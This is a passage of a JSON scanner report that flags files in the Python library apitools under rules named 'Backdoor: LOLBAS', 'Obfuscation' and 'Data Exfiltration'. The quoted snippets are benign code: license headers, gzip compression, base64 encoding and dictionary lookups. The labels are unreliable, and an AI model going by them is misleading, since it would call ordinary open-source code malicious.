                    "text": "    with gzip.GzipFile(mode='wb',\n                       fileobj=out_stream,\n                       compresslevel=compresslevel) as compress_stream:\n        # Read until we've written at least length bytes to the output stream.\n        while not length or out_stream.length < length:\n            data = in_stream.read(chunksize)\n            data_length = len(data)\n",
                    "rendered": {
                      "text": "    with gzip.GzipFile(mode='wb',\n                       fileobj=out_stream,\n                       compresslevel=compresslevel) as compress_stream:\n        # Read until we've written at least length bytes to the output stream.\n        while not length or out_stream.length < length:\n            data = in_stream.read(chunksize)\n            data_length = len(data)\n",
                      "markdown": "`    with gzip.GzipFile(mode='wb',\n                       fileobj=out_stream,\n                       compresslevel=compresslevel) as compress_stream:\n        # Read until we've written at least length bytes to the output stream.\n        while not length or out_stream.length < length:\n            data = in_stream.read(chunksize)\n            data_length = len(data)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/compression.py"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 62,
                  "endLine": 35,
                  "endColumn": 66,
                  "snippet": {
                    "text": "\n    \"\"\"Compresses an input stream into a file-like buffer.\n\n    This reads from the input stream until either we've stored at least length\n    compressed bytes, or the input stream has been exhausted.\n\n    This supports streams of unknown size.\n",
                    "rendered": {
                      "text": "\n    \"\"\"Compresses an input stream into a file-like buffer.\n\n    This reads from the input stream until either we've stored at least length\n    compressed bytes, or the input stream has been exhausted.\n\n    This supports streams of unknown size.\n",
                      "markdown": "`\n    \"\"\"Compresses an input stream into a file-like buffer.\n\n    This reads from the input stream until either we've stored at least length\n    compressed bytes, or the input stream has been exhausted.\n\n    This supports streams of unknown size.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/compression.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/exceptions_test.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/stream_slice_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/list_pager.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/list_pager.py"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 46,
                  "endLine": 75,
                  "endColumn": 55,
                  "snippet": {
                    "text": "    \"\"\"Make a series of List requests, keeping track of page tokens.\n\n    Args:\n      service: apitools_base.BaseApiService, A service with a .List() method.\n      request: protorpc.messages.Message, The request message\n          corresponding to the service's .List() method, with all the\n          attributes populated except the .maxResults and .pageToken\n",
                    "rendered": {
                      "text": "    \"\"\"Make a series of List requests, keeping track of page tokens.\n\n    Args:\n      service: apitools_base.BaseApiService, A service with a .List() method.\n      request: protorpc.messages.Message, The request message\n          corresponding to the service's .List() method, with all the\n          attributes populated except the .maxResults and .pageToken\n",
                      "markdown": "`    \"\"\"Make a series of List requests, keeping track of page tokens.\n\n    Args:\n      service: apitools_base.BaseApiService, A service with a .List() method.\n      request: protorpc.messages.Message, The request message\n          corresponding to the service's .List() method, with all the\n          attributes populated except the .maxResults and .pageToken\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 705,
                  "startColumn": 56,
                  "endLine": 705,
                  "endColumn": 60,
                  "snippet": {
                    "text": "            # and then passes its reply to a download if one exists, and\n            # then that goes to ProcessResponse and is returned.\n            raise exceptions.NotYetImplementedError(\n                'Cannot yet use both upload and download at once')\n\n        http_request = self.PrepareHttpRequest(\n            method_config, request, global_params, upload, upload_config,\n",
                    "rendered": {
                      "text": "            # and then passes its reply to a download if one exists, and\n            # then that goes to ProcessResponse and is returned.\n            raise exceptions.NotYetImplementedError(\n                'Cannot yet use both upload and download at once')\n\n        http_request = self.PrepareHttpRequest(\n            method_config, request, global_params, upload, upload_config,\n",
                      "markdown": "`            # and then passes its reply to a download if one exists, and\n            # then that goes to ProcessResponse and is returned.\n            raise exceptions.NotYetImplementedError(\n                'Cannot yet use both upload and download at once')\n\n        http_request = self.PrepareHttpRequest(\n            method_config, request, global_params, upload, upload_config,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 612,
                  "startColumn": 31,
                  "endLine": 612,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            raise exceptions.HttpError.FromResponse(\n                http_response, method_config=method_config, request=request)\n        if http_response.status_code == http_client.NO_CONTENT:\n            # TODO(craigcitro): Find out why _replace doesn't seem to work\n            # here.\n            http_response = http_wrapper.Response(\n                info=http_response.info, content='{}',\n",
                    "rendered": {
                      "text": "            raise exceptions.HttpError.FromResponse(\n                http_response, method_config=method_config, request=request)\n        if http_response.status_code == http_client.NO_CONTENT:\n            # TODO(craigcitro): Find out why _replace doesn't seem to work\n            # here.\n            http_response = http_wrapper.Response(\n                info=http_response.info, content='{}',\n",
                      "markdown": "`            raise exceptions.HttpError.FromResponse(\n                http_response, method_config=method_config, request=request)\n        if http_response.status_code == http_client.NO_CONTENT:\n            # TODO(craigcitro): Find out why _replace doesn't seem to work\n            # here.\n            http_response = http_wrapper.Response(\n                info=http_response.info, content='{}',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 486,
                  "startColumn": 18,
                  "endLine": 486,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        return self.__client\n\n    def GetMethodConfig(self, method):\n        \"\"\"Returns service cached method config for given method.\"\"\"\n        method_config = self._method_configs.get(method)\n        if method_config:\n            return method_config\n",
                    "rendered": {
                      "text": "        return self.__client\n\n    def GetMethodConfig(self, method):\n        \"\"\"Returns service cached method config for given method.\"\"\"\n        method_config = self._method_configs.get(method)\n        if method_config:\n            return method_config\n",
                      "markdown": "`        return self.__client\n\n    def GetMethodConfig(self, method):\n        \"\"\"Returns service cached method config for given method.\"\"\"\n        method_config = self._method_configs.get(method)\n        if method_config:\n            return method_config\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 6,
                  "endLine": 20,
                  "snippet": {
                    "text": "\n\"\"\"Base class for api services.\"\"\"\n\nimport base64\nimport contextlib\nimport datetime\nimport logging\nimport pprint\n",
                    "rendered": {
                      "text": "\n\"\"\"Base class for api services.\"\"\"\n\nimport base64\nimport contextlib\nimport datetime\nimport logging\nimport pprint\n",
                      "markdown": "`\n\"\"\"Base class for api services.\"\"\"\n\nimport base64\nimport contextlib\nimport datetime\nimport logging\nimport pprint\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 544,
                  "startColumn": 19,
                  "endLine": 544,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def __FinalUrlValue(self, value, field):\n        \"\"\"Encode value for the URL, using field to skip encoding for bytes.\"\"\"\n        if isinstance(field, messages.BytesField) and value is not None:\n            return base64.urlsafe_b64encode(value)\n        elif isinstance(value, six.text_type):\n            return value.encode('utf8')\n        elif isinstance(value, six.binary_type):\n",
                    "rendered": {
                      "text": "    def __FinalUrlValue(self, value, field):\n        \"\"\"Encode value for the URL, using field to skip encoding for bytes.\"\"\"\n        if isinstance(field, messages.BytesField) and value is not None:\n            return base64.urlsafe_b64encode(value)\n        elif isinstance(value, six.text_type):\n            return value.encode('utf8')\n        elif isinstance(value, six.binary_type):\n",
                      "markdown": "`    def __FinalUrlValue(self, value, field):\n        \"\"\"Encode value for the URL, using field to skip encoding for bytes.\"\"\"\n        if isinstance(field, messages.BytesField) and value is not None:\n            return base64.urlsafe_b64encode(value)\n        elif isinstance(value, six.text_type):\n            return value.encode('utf8')\n        elif isinstance(value, six.binary_type):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 7,
                  "endLine": 19,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n\"\"\"Base class for api services.\"\"\"\n\nimport base64\nimport contextlib\nimport datetime\nimport logging\n",
                    "rendered": {
                      "text": "\n\"\"\"Base class for api services.\"\"\"\n\nimport base64\nimport contextlib\nimport datetime\nimport logging\n",
                      "markdown": "`\n\"\"\"Base class for api services.\"\"\"\n\nimport base64\nimport contextlib\nimport datetime\nimport logging\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 672,
                  "startColumn": 35,
                  "endLine": 672,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        util.Typecheck(request, request_type)\n        request = self.__client.ProcessRequest(method_config, request)\n\n        http_request = http_wrapper.Request(\n            http_method=method_config.http_method)\n        self.__SetBaseHeaders(http_request, self.__client)\n        self.__SetBody(http_request, method_config, request, upload)\n",
                    "rendered": {
                      "text": "        util.Typecheck(request, request_type)\n        request = self.__client.ProcessRequest(method_config, request)\n\n        http_request = http_wrapper.Request(\n            http_method=method_config.http_method)\n        self.__SetBaseHeaders(http_request, self.__client)\n        self.__SetBody(http_request, method_config, request, upload)\n",
                      "markdown": "`        util.Typecheck(request, request_type)\n        request = self.__client.ProcessRequest(method_config, request)\n\n        http_request = http_wrapper.Request(\n            http_method=method_config.http_method)\n        self.__SetBaseHeaders(http_request, self.__client)\n        self.__SetBody(http_request, method_config, request, upload)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 505,
                  "startColumn": 35,
                  "endLine": 505,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                if getattr(f, 'method_config', None)]\n\n    def GetUploadConfig(self, method):\n        return self._upload_configs.get(method)\n\n    def GetRequestType(self, method):\n        method_config = self.GetMethodConfig(method)\n",
                    "rendered": {
                      "text": "                if getattr(f, 'method_config', None)]\n\n    def GetUploadConfig(self, method):\n        return self._upload_configs.get(method)\n\n    def GetRequestType(self, method):\n        method_config = self.GetMethodConfig(method)\n",
                      "markdown": "`                if getattr(f, 'method_config', None)]\n\n    def GetUploadConfig(self, method):\n        return self._upload_configs.get(method)\n\n    def GetRequestType(self, method):\n        method_config = self.GetMethodConfig(method)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/base_api.py"
                },
                "region": {
                  "startLine": 487,
                  "startColumn": 44,
                  "endLine": 487,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n    def GetMethodConfig(self, method):\n        \"\"\"Returns service cached method config for given method.\"\"\"\n        method_config = self._method_configs.get(method)\n        if method_config:\n            return method_config\n        func = getattr(self, method, None)\n",
                    "rendered": {
                      "text": "\n    def GetMethodConfig(self, method):\n        \"\"\"Returns service cached method config for given method.\"\"\"\n        method_config = self._method_configs.get(method)\n        if method_config:\n            return method_config\n        func = getattr(self, method, None)\n",
                      "markdown": "`\n    def GetMethodConfig(self, method):\n        \"\"\"Returns service cached method config for given method.\"\"\"\n        method_config = self._method_configs.get(method)\n        if method_config:\n            return method_config\n        func = getattr(self, method, None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_lib.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_lib.py"
                },
                "region": {
                  "startLine": 116,
                  "startColumn": 42,
                  "endLine": 116,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            self.__services_registry.AddServiceFromResource(\n                service_name, methods)\n        # We might also have top-level methods.\n        api_methods = self.__discovery_doc.get('methods', [])\n        if api_methods:\n            self.__services_registry.AddServiceFromResource(\n                'api', {'methods': api_methods})\n",
                    "rendered": {
                      "text": "            self.__services_registry.AddServiceFromResource(\n                service_name, methods)\n        # We might also have top-level methods.\n        api_methods = self.__discovery_doc.get('methods', [])\n        if api_methods:\n            self.__services_registry.AddServiceFromResource(\n                'api', {'methods': api_methods})\n",
                      "markdown": "`            self.__services_registry.AddServiceFromResource(\n                service_name, methods)\n        # We might also have top-level methods.\n        api_methods = self.__discovery_doc.get('methods', [])\n        if api_methods:\n            self.__services_registry.AddServiceFromResource(\n                'api', {'methods': api_methods})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_lib.py"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 39,
                  "endLine": 111,
                  "endColumn": 44,
                  "snippet": {
                    "text": "            self.__root_package,\n            self.__base_files_package,\n            unelidable_request_methods or [])\n        services = self.__discovery_doc.get('resources', {})\n        for service_name, methods in sorted(services.items()):\n            self.__services_registry.AddServiceFromResource(\n                service_name, methods)\n",
                    "rendered": {
                      "text": "            self.__root_package,\n            self.__base_files_package,\n            unelidable_request_methods or [])\n        services = self.__discovery_doc.get('resources', {})\n        for service_name, methods in sorted(services.items()):\n            self.__services_registry.AddServiceFromResource(\n                service_name, methods)\n",
                      "markdown": "`            self.__root_package,\n            self.__base_files_package,\n            unelidable_request_methods or [])\n        services = self.__discovery_doc.get('resources', {})\n        for service_name, methods in sorted(services.items()):\n            self.__services_registry.AddServiceFromResource(\n                service_name, methods)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_lib.py"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 38,
                  "endLine": 89,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            self.__client_info, self.__names, self.__description,\n            self.__root_package, self.__base_files_package,\n            self.__protorpc_package)\n        schemas = self.__discovery_doc.get('schemas', {})\n        for schema_name, schema in sorted(schemas.items()):\n            self.__message_registry.AddDescriptorFromSchema(\n                schema_name, schema)\n",
                    "rendered": {
                      "text": "            self.__client_info, self.__names, self.__description,\n            self.__root_package, self.__base_files_package,\n            self.__protorpc_package)\n        schemas = self.__discovery_doc.get('schemas', {})\n        for schema_name, schema in sorted(schemas.items()):\n            self.__message_registry.AddDescriptorFromSchema(\n                schema_name, schema)\n",
                      "markdown": "`            self.__client_info, self.__names, self.__description,\n            self.__root_package, self.__base_files_package,\n            self.__protorpc_package)\n        schemas = self.__discovery_doc.get('schemas', {})\n        for schema_name, schema in sorted(schemas.items()):\n            self.__message_registry.AddDescriptorFromSchema(\n                schema_name, schema)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_lib.py"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 39,
                  "endLine": 76,
                  "endColumn": 44,
                  "snippet": {
                    "text": "            self.__discovery_doc.get('description', ''))\n        self.__package = self.__client_info.package\n        self.__version = self.__client_info.version\n        self.__revision = discovery_doc.get('revision', '1')\n        self.__init_wildcards_file = init_wildcards_file\n        self.__root_package = root_package\n        self.__base_files_package = base_package\n",
                    "rendered": {
                      "text": "            self.__discovery_doc.get('description', ''))\n        self.__package = self.__client_info.package\n        self.__version = self.__client_info.version\n        self.__revision = discovery_doc.get('revision', '1')\n        self.__init_wildcards_file = init_wildcards_file\n        self.__root_package = root_package\n        self.__base_files_package = base_package\n",
                      "markdown": "`            self.__discovery_doc.get('description', ''))\n        self.__package = self.__client_info.package\n        self.__version = self.__client_info.version\n        self.__revision = discovery_doc.get('revision', '1')\n        self.__init_wildcards_file = init_wildcards_file\n        self.__root_package = root_package\n        self.__base_files_package = base_package\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client_lib.py"
                },
                "region": {
                  "startLine": 73,
                  "startColumn": 32,
                  "endLine": 73,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        self.__outdir = outdir\n        self.__use_proto2 = use_proto2\n        self.__description = util.CleanDescription(\n            self.__discovery_doc.get('description', ''))\n        self.__package = self.__client_info.package\n        self.__version = self.__client_info.version\n        self.__revision = discovery_doc.get('revision', '1')\n",
                    "rendered": {
                      "text": "        self.__outdir = outdir\n        self.__use_proto2 = use_proto2\n        self.__description = util.CleanDescription(\n            self.__discovery_doc.get('description', ''))\n        self.__package = self.__client_info.package\n        self.__version = self.__client_info.version\n        self.__revision = discovery_doc.get('revision', '1')\n",
                      "markdown": "`        self.__outdir = outdir\n        self.__use_proto2 = use_proto2\n        self.__description = util.CleanDescription(\n            self.__discovery_doc.get('description', ''))\n        self.__package = self.__client_info.package\n        self.__version = self.__client_info.version\n        self.__revision = discovery_doc.get('revision', '1')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
